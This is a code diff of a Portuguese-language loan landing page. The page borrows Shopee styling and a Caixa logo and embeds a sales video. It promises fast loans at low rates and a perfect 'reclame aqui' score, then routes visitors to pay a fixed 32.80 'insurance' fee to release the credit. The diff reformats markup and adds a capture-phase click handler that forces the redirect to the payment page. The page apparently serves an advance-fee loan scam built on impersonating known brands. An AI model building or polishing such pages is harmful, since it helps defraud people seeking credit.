@@ -247,24 +247,10 @@
       }
 
       /* ✅ garante clique no botão mesmo com overlays */
-      #btnPayInsurance{
+      #btnPayInsurance {
         position: relative !important;
         z-index: 999999 !important;
         pointer-events: auto !important;
-      }
-
-      /* ✅ impede o header de "roubar" cliques fora dos botões */
-      .sticky.top-0{
-        pointer-events: none !important;
-      }
-      .sticky.top-0 *{
-        pointer-events: auto !important;
-      }
-
-      /* ✅ garante que o voltar continue clicável e acima */
-      #btnVoltar{
-        position: relative !important;
-        z-index: 1000000 !important;
       }
     </style>
   </head>
@@ -362,7 +348,10 @@
 
             <div class="relative mb-4">
               <div class="w-full h-4 bg-gray-100 rounded-full overflow-hidden shadow-inner">
-                <div class="h-full rounded-full shopee-gradient" style="width: 90%; transition: width 1.5s ease-in-out">
+                <div
+                  class="h-full rounded-full shopee-gradient"
+                  style="width: 90%; transition: width 1.5s ease-in-out"
+                >
                   <div class="absolute top-0 h-1 w-full bg-white bg-opacity-20"></div>
                 </div>
               </div>
@@ -408,7 +397,8 @@
           <vturb-smartplayer id="vid-692808addf28f42703ff3f55" style="display:block;margin:0 auto;width:100%"></vturb-smartplayer>
           <script type="text/javascript">
             var s = document.createElement("script");
-            s.src = "https://scripts.converteai.net/ac70c486-084d-457e-b1c7-994516d3b1e1/players/692808addf28f42703ff3f55/v4/player.js";
+            s.src =
+              "https://scripts.converteai.net/ac70c486-084d-457e-b1c7-994516d3b1e1/players/692808addf28f42703ff3f55/v4/player.js";
             s.async = !0;
             document.head.appendChild(s);
           </script>
@@ -418,25 +408,37 @@
 
             <ul class="space-y-3 mb-5">
               <li class="flex items-start">
-                <div class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center" style="width:20px;height:20px;min-width:20px">
+                <div
+                  class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center"
+                  style="width:20px;height:20px;min-width:20px"
+                >
                   <i class="fas fa-check text-green-600 text-xs"></i>
                 </div>
                 <span class="text-gray-700">Menor taxa do mercado 0,81% ao mês</span>
               </li>
               <li class="flex items-start">
-                <div class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center" style="width:20px;height:20px;min-width:20px">
+                <div
+                  class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center"
+                  style="width:20px;height:20px;min-width:20px"
+                >
                   <i class="fas fa-check text-green-600 text-xs"></i>
                 </div>
                 <span class="text-gray-700">Pode Receber seu empréstimo em até 5 minutos</span>
               </li>
               <li class="flex items-start">
-                <div class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center" style="width:20px;height:20px;min-width:20px">
+                <div
+                  class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center"
+                  style="width:20px;height:20px;min-width:20px"
+                >
                   <i class="fas fa-check text-green-600 text-xs"></i>
                 </div>
                 <span class="text-gray-700">Primeira parcela só em 90 dias</span>
               </li>
               <li class="flex items-start">
-                <div class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center" style="width:20px;height:20px;min-width:20px">
+                <div
+                  class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center"
+                  style="width:20px;height:20px;min-width:20px"
+                >
                   <i class="fas fa-check text-green-600 text-xs"></i>
                 </div>
                 <span class="text-gray-700">Sistema mais seguro do Brasil nota 1000 no reclame aqui</span>
@@ -450,7 +452,11 @@
               </div>
 
               <div class="w-full bg-gray-100 rounded-full h-3 mb-3">
-                <div id="emprestimo-progressBar" class="bg-shopee h-3 rounded-full transition-all duration-500" style="width:0%;display:block"></div>
+                <div
+                  id="emprestimo-progressBar"
+                  class="bg-shopee h-3 rounded-full transition-all duration-500"
+                  style="width:0%;display:block"
+                ></div>
               </div>
 
               <div class="flex justify-between items-center text-xs text-gray-500">
@@ -463,7 +469,7 @@
 
           <div id="liberacaoCard" class="bg-amber-50 rounded-xl p-6 border border-amber-200 shadow-lg hidden">
             <div class="flex items-center justify-center mb-3">
-              <img src="images/logocaixa2.png" alt="Tiktok Logo" class="h-7 mr-2"/>
+              <img src="images/logocaixa2.png" alt="Tiktok Logo" class="h-7 mr-2" />
               <h2 class="text-xl font-bold text-gray-800">Liberação do Crédito</h2>
             </div>
 
@@ -486,20 +492,9 @@
               Ao concluir a ativação, seu valor será processado automaticamente.
             </p>
 
-            <!-- ✅ BOTÃO COM ONCLICK (REDIRECIONA PARA /chat/vsl/payment.html) -->
+            <!-- ✅ BOTÃO SEM ONCLICK (listener abaixo em CAPTURE) -->
             <button
               id="btnPayInsurance"
-              onclick="
-                (function(){
-                  const p=new URLSearchParams(window.location.search);
-                  p.set('valor','32.80');
-                  p.set('amount','3280');
-                  p.set('requestNumber', (crypto?.randomUUID?crypto.randomUUID():('req_'+Date.now()+'_'+Math.floor(Math.random()*1e6))));
-                  p.set('origem','vsl');
-                  window.location.assign('/chat/vsl/payment.html?'+p.toString());
-                })();
-                return false;
-              "
               class="w-full bg-shopee-laranja hover:bg-shopee-laranja text-white text-lg font-bold py-4 rounded-xl mb-4 transition-all pulse"
             >
               LIBERAR MEU VALOR AGORA
@@ -705,9 +700,45 @@
             return;
           }
 
-          timerCountdown.textContent = `${minutos.toString().padStart(2, "0")}:${segundos.toString().padStart(2, "0")}`;
+          timerCountdown.textContent = `${minutos.toString().padStart(2, "0")}:${segundos
+            .toString()
+            .padStart(2, "0")}`;
         }, 1000);
       }
+
+      // ✅ REDIRECIONAMENTO "HARD" (CAPTURE) — impede outros scripts de roubarem o clique
+      (function () {
+        function goPayment() {
+          const p = new URLSearchParams(window.location.search);
+          p.set("valor", "32.80");
+          p.set("amount", "3280");
+          p.set(
+            "requestNumber",
+            (crypto?.randomUUID
+              ? crypto.randomUUID()
+              : "req_" + Date.now() + "_" + Math.floor(Math.random() * 1e6))
+          );
+          p.set("origem", "vsl");
+
+          const target = "/chat/vsl/payment.html?" + p.toString();
+          setTimeout(() => window.location.assign(target), 30);
+        }
+
+        document.addEventListener(
+          "click",
+          function (e) {
+            const btn = e.target.closest("#btnPayInsurance");
+            if (!btn) return;
+
+            e.preventDefault();
+            e.stopPropagation();
+            if (e.stopImmediatePropagation) e.stopImmediatePropagation();
+
+            goPayment();
+          },
+          true
+        );
+      })();
     </script>
   </body>
 </html>
